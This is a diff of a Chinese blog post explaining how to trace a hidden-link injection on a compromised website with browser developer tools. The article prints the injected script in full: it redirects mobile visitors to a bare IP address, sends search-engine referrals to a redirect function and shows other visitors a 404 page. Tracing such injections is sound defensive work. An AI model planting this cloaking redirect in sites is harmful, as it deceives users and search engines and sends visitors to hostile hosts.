@@ -15,17 +15,17 @@
 <meta property="og:site_name" content="招女朋友（doge）">
 <meta property="og:description" content="工具谷歌浏览器 测试目标1www.*****.cn&#x2F;wxxx&#x2F;qndt&#x2F;202007&#x2F;t20200729_811545.htm  准备 浏览器点击F12打开”开发人员工具” 选择“网络” 勾选“保留日志”[^1] 勾选“禁用缓存”[^2]   开始在该页面访问挂有暗链的页面，“网络”记录下整个访问过程中所有加载的文件（未修改UA，浏览器直接跳转到404页面）">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://bigmancer.github.io/2020/10/20/%E4%B8%80%E7%A7%8D%E6%9F%A5%E7%9C%8B%E6%9A%97%E9%93%BE%E6%9D%A5%E6%BA%90%E7%9A%84%E8%B7%9F%E8%B8%AA%E6%96%B9%E6%B3%95/file/code/Blog/source_posts/2020-10-20-一种查看暗链来源的跟踪方法/image-20201020231747722.png">
+<meta property="og:image" content="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-10-20-%E4%B8%80%E7%A7%8D%E6%9F%A5%E7%9C%8B%E6%9A%97%E9%93%BE%E6%9D%A5%E6%BA%90%E7%9A%84%E8%B7%9F%E8%B8%AA%E6%96%B9%E6%B3%95/image-20201020231747722.png">
 <meta property="og:image" content="https://bigmancer.github.io/2020/10/20/%E4%B8%80%E7%A7%8D%E6%9F%A5%E7%9C%8B%E6%9A%97%E9%93%BE%E6%9D%A5%E6%BA%90%E7%9A%84%E8%B7%9F%E8%B8%AA%E6%96%B9%E6%B3%95/E:%5Cfile%5Ccode%5CBlog%5Csource%5C_posts%5C2020-10-20-%E4%B8%80%E7%A7%8D%E6%9F%A5%E7%9C%8B%E6%9A%97%E9%93%BE%E6%9D%A5%E6%BA%90%E7%9A%84%E8%B7%9F%E8%B8%AA%E6%96%B9%E6%B3%95%5Cimage-20201020232048901.png">
-<meta property="og:image" content="https://bigmancer.github.io/2020/10/20/%E4%B8%80%E7%A7%8D%E6%9F%A5%E7%9C%8B%E6%9A%97%E9%93%BE%E6%9D%A5%E6%BA%90%E7%9A%84%E8%B7%9F%E8%B8%AA%E6%96%B9%E6%B3%95/file/code/Blog/source_posts/2020-10-20-一种查看暗链来源的跟踪方法/image-20201020232239806.png">
+<meta property="og:image" content="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-10-20-%E4%B8%80%E7%A7%8D%E6%9F%A5%E7%9C%8B%E6%9A%97%E9%93%BE%E6%9D%A5%E6%BA%90%E7%9A%84%E8%B7%9F%E8%B8%AA%E6%96%B9%E6%B3%95/image-20201020232239806.png">
 <meta property="og:image" content="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/image-20201020232507883.png">
-<meta property="og:image" content="https://bigmancer.github.io/2020/10/20/%E4%B8%80%E7%A7%8D%E6%9F%A5%E7%9C%8B%E6%9A%97%E9%93%BE%E6%9D%A5%E6%BA%90%E7%9A%84%E8%B7%9F%E8%B8%AA%E6%96%B9%E6%B3%95/file/code/Blog/source_posts/2020-10-20-一种查看暗链来源的跟踪方法/image-20201020232921588.png">
+<meta property="og:image" content="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-10-20-%E4%B8%80%E7%A7%8D%E6%9F%A5%E7%9C%8B%E6%9A%97%E9%93%BE%E6%9D%A5%E6%BA%90%E7%9A%84%E8%B7%9F%E8%B8%AA%E6%96%B9%E6%B3%95/image-20201020232921588.png">
 <meta property="article:published_time" content="2020-10-20T15:11:47.000Z">
-<meta property="article:modified_time" content="2020-10-22T09:09:23.660Z">
+<meta property="article:modified_time" content="2020-11-26T07:16:19.785Z">
 <meta property="article:author" content="Machine">
 <meta property="article:tag" content="调试">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://bigmancer.github.io/2020/10/20/%E4%B8%80%E7%A7%8D%E6%9F%A5%E7%9C%8B%E6%9A%97%E9%93%BE%E6%9D%A5%E6%BA%90%E7%9A%84%E8%B7%9F%E8%B8%AA%E6%96%B9%E6%B3%95/file/code/Blog/source_posts/2020-10-20-一种查看暗链来源的跟踪方法/image-20201020231747722.png">
+<meta name="twitter:image" content="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-10-20-%E4%B8%80%E7%A7%8D%E6%9F%A5%E7%9C%8B%E6%9A%97%E9%93%BE%E6%9D%A5%E6%BA%90%E7%9A%84%E8%B7%9F%E8%B8%AA%E6%96%B9%E6%B3%95/image-20201020231747722.png">
   
     <link rel="alternative" href="/atom.xml" title="招女朋友（doge）" type="application/atom+xml">
   
@@ -188,18 +188,18 @@
 <li>勾选“保留日志”[^1]</li>
 <li>勾选“禁用缓存”[^2]</li>
 </ol>
-<p><img src="/2020/10/20/%E4%B8%80%E7%A7%8D%E6%9F%A5%E7%9C%8B%E6%9A%97%E9%93%BE%E6%9D%A5%E6%BA%90%E7%9A%84%E8%B7%9F%E8%B8%AA%E6%96%B9%E6%B3%95/file\code\Blog\source_posts\2020-10-20-一种查看暗链来源的跟踪方法\image-20201020231747722.png" alt="image-20201020231747722"></p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-10-20-%E4%B8%80%E7%A7%8D%E6%9F%A5%E7%9C%8B%E6%9A%97%E9%93%BE%E6%9D%A5%E6%BA%90%E7%9A%84%E8%B7%9F%E8%B8%AA%E6%96%B9%E6%B3%95/image-20201020231747722.png" alt="image-20201020231747722"></p>
 <h1 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h1><p>在该页面访问挂有暗链的页面，“网络”记录下整个访问过程中所有加载的文件（未修改UA，浏览器直接跳转到404页面）</p>
 <p><img src="/2020/10/20/%E4%B8%80%E7%A7%8D%E6%9F%A5%E7%9C%8B%E6%9A%97%E9%93%BE%E6%9D%A5%E6%BA%90%E7%9A%84%E8%B7%9F%E8%B8%AA%E6%96%B9%E6%B3%95/E:%5Cfile%5Ccode%5CBlog%5Csource%5C_posts%5C2020-10-20-%E4%B8%80%E7%A7%8D%E6%9F%A5%E7%9C%8B%E6%9A%97%E9%93%BE%E6%9D%A5%E6%BA%90%E7%9A%84%E8%B7%9F%E8%B8%AA%E6%96%B9%E6%B3%95%5Cimage-20201020232048901.png" alt="image-20201020232048901"></p>
 <p>在”网络“内查找该404页面</p>
-<p><img src="/2020/10/20/%E4%B8%80%E7%A7%8D%E6%9F%A5%E7%9C%8B%E6%9A%97%E9%93%BE%E6%9D%A5%E6%BA%90%E7%9A%84%E8%B7%9F%E8%B8%AA%E6%96%B9%E6%B3%95/file\code\Blog\source_posts\2020-10-20-一种查看暗链来源的跟踪方法\image-20201020232239806.png" alt="image-20201020232239806"></p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-10-20-%E4%B8%80%E7%A7%8D%E6%9F%A5%E7%9C%8B%E6%9A%97%E9%93%BE%E6%9D%A5%E6%BA%90%E7%9A%84%E8%B7%9F%E8%B8%AA%E6%96%B9%E6%B3%95/image-20201020232239806.png" alt="image-20201020232239806"></p>
 <p>点击后，选择“发起程序”标签，可查看到调用的整个程序链。</p>
 <p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/image-20201020232507883.png" alt="image-20201020232507883"></p>
 <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本次测试，请求程序链为</p>
 <p>www.*****.cn/wxxx/qndt/202007/t20200729_811545.htm</p>
 <p>发起请求，请求调用<a target="_blank" rel="noopener" href="http://js.baile89.com/sjs.js">http://js.baile89.com/sjs.js</a>  该JS文件</p>
 <p>然后浏览器执行该JS文件，依照JS，进行跳转处理（非爬虫类，跳转至404）</p>
-<h2 id="t20200729-811545-htm调用"><a href="#t20200729-811545-htm调用" class="headerlink" title="t20200729_811545.htm调用"></a>t20200729_811545.htm调用</h2><p><img src="/2020/10/20/%E4%B8%80%E7%A7%8D%E6%9F%A5%E7%9C%8B%E6%9A%97%E9%93%BE%E6%9D%A5%E6%BA%90%E7%9A%84%E8%B7%9F%E8%B8%AA%E6%96%B9%E6%B3%95/file\code\Blog\source_posts\2020-10-20-一种查看暗链来源的跟踪方法\image-20201020232921588.png" alt="image-20201020232921588"></p>
+<h2 id="t20200729-811545-htm调用"><a href="#t20200729-811545-htm调用" class="headerlink" title="t20200729_811545.htm调用"></a>t20200729_811545.htm调用</h2><p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-10-20-%E4%B8%80%E7%A7%8D%E6%9F%A5%E7%9C%8B%E6%9A%97%E9%93%BE%E6%9D%A5%E6%BA%90%E7%9A%84%E8%B7%9F%E8%B8%AA%E6%96%B9%E6%B3%95/image-20201020232921588.png" alt="image-20201020232921588"></p>
 <h2 id="http-js-baile89-com-sjs-js代码"><a href="#http-js-baile89-com-sjs-js代码" class="headerlink" title="http://js.baile89.com/sjs.js代码"></a><a target="_blank" rel="noopener" href="http://js.baile89.com/sjs.js%E4%BB%A3%E7%A0%81">http://js.baile89.com/sjs.js代码</a></h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> _hmt = _hmt || [];</span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> hm = <span class="built_in">document</span>.createElement(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">  hm.src = <span class="string">&quot;https://hm.baidu.com/hm.js?4a9d4dfb542a69cd1415eae873f1c84c&quot;</span>;</span><br><span class="line">  <span class="keyword">var</span> s = <span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;script&quot;</span>)[<span class="number">0</span>]; </span><br><span class="line">  s.parentNode.insertBefore(hm, s);</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">/*百度推送代码*/</span></span><br><span class="line">     <span class="keyword">var</span> bp = <span class="built_in">document</span>.createElement(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">     bp.src = <span class="string">&#x27;//push.zhanzhang.baidu.com/push.js&#x27;</span>;</span><br><span class="line">     <span class="keyword">var</span> s = <span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;script&quot;</span>)[<span class="number">0</span>];</span><br><span class="line">     s.parentNode.insertBefore(bp, s);</span><br><span class="line">     <span class="comment">/*360推送代码*/</span></span><br><span class="line">     <span class="keyword">var</span> src = <span class="built_in">document</span>.location.protocol + <span class="string">&#x27;//js.passport.qihucdn.com/11.0.1.js?8113138f123429f4e46184e7146e43d9&#x27;</span>;</span><br><span class="line">     <span class="built_in">document</span>.write(<span class="string">&#x27;&lt;script src=&quot;&#x27;</span> + src + <span class="string">&#x27;&quot; id=&quot;sozz&quot;&gt;&lt;\/script&gt;&#x27;</span>);</span><br><span class="line">     &#125;)();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((navigator.userAgent.match(<span class="regexp">/(iPhone|iPod|Android|ios|mobile)/i</span>))) &#123;</span><br><span class="line">  <span class="built_in">setInterval</span>(tiaozhuan,<span class="number">500</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">var</span> url = <span class="string">&#x27;http://45.158.22.18&#x27;</span>;</span><br><span class="line">  location.replace(url)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tiaozhuan</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> url = <span class="string">&#x27;http://45.158.22.18&#x27;</span>;</span><br><span class="line">  location.replace(url)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> bct = <span class="built_in">document</span>.referrer;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">call_init_error</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">window</span>.location.href = <span class="string">&quot;/404.html&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> init_flag = <span class="string">&quot;93989&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> bot = [<span class="string">&#x27;so&#x27;</span>,<span class="string">&#x27;baidu&#x27;</span>, <span class="string">&#x27;google&#x27;</span>, <span class="string">&#x27;yahoo&#x27;</span>, <span class="string">&#x27;bing&#x27;</span>, <span class="string">&#x27;soso&#x27;</span>, <span class="string">&#x27;sogou&#x27;</span>, <span class="string">&#x27;360.cn&#x27;</span>, <span class="string">&#x27;so.com&#x27;</span>, <span class="string">&#x27;youdao&#x27;</span>, <span class="string">&#x27;anquan&#x27;</span>,<span class="string">&#x27;sm.cn&#x27;</span>,<span class="string">&#x27;bsb&#x27;</span>,<span class="string">&#x27;sm&#x27;</span>];<span class="comment">//, &#x27;haosou&#x27;];</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i <span class="keyword">in</span> bot) &#123;</span><br><span class="line">    <span class="keyword">if</span> (bct.indexOf(bot[i]) != <span class="number">-1</span>) &#123;</span><br><span class="line">        init_flag = <span class="string">&quot;1245&quot;</span>;</span><br><span class="line">        browserRedirect();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (init_flag == <span class="string">&quot;93989&quot;</span>) &#123;</span><br><span class="line">    call_init_error()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 
@@ -502,15 +502,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">BAT</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">CMD</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">Windows</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">BAT</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -522,11 +522,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">docker</a>
+                <a href="javascript:void(0)" class="js-tag color3">奇奇怪怪的工具</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">奇奇怪怪的工具</a>
+                <a href="javascript:void(0)" class="js-tag color2">docker</a>
               </li>
              
               <li class="article-tag-list-item">
